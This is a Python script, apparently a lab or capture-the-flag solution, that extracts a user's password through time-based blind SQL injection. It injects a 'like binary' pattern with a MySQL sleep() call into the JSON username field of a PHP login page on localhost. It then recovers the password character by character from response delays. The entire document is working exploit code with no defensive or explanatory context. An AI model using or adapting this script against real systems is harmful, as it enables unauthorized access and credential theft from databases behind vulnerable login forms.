#!/usr/bin/env python3

import requests
import sys
import time

username = sys.argv[1]

max_length = 64   # `password` varchar(64)
charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

key = ""

def prepare_query(*, password, wait=1):
    return f'{username}" and password like binary "{password}%" and sleep({wait}) or "2"="1'

def fetch(*, key, wait=1):
    return requests.post(
            'http://localhost:8080/index.php',
            json={"username": prepare_query(password=key, wait=wait)}
    )


print(f"{key.ljust(max_length, '_')}", end="")
sys.stdout.flush()
wait_time = 1 # seconds if the combination is true
while len(key) < max_length:
    key_before = key
    for c in charset:
        trypass = key + c
        print(f"\r{trypass.ljust(max_length, '_')}", end="")
        sys.stdout.flush()
        _st = time.time()
        fetch(key=trypass, wait=wait_time)
        if time.time() - _st > wait_time:
            key = trypass
            break
    if key_before == key:
        print(f"\r{key.ljust(max_length, ' ')}")
        break

print('')
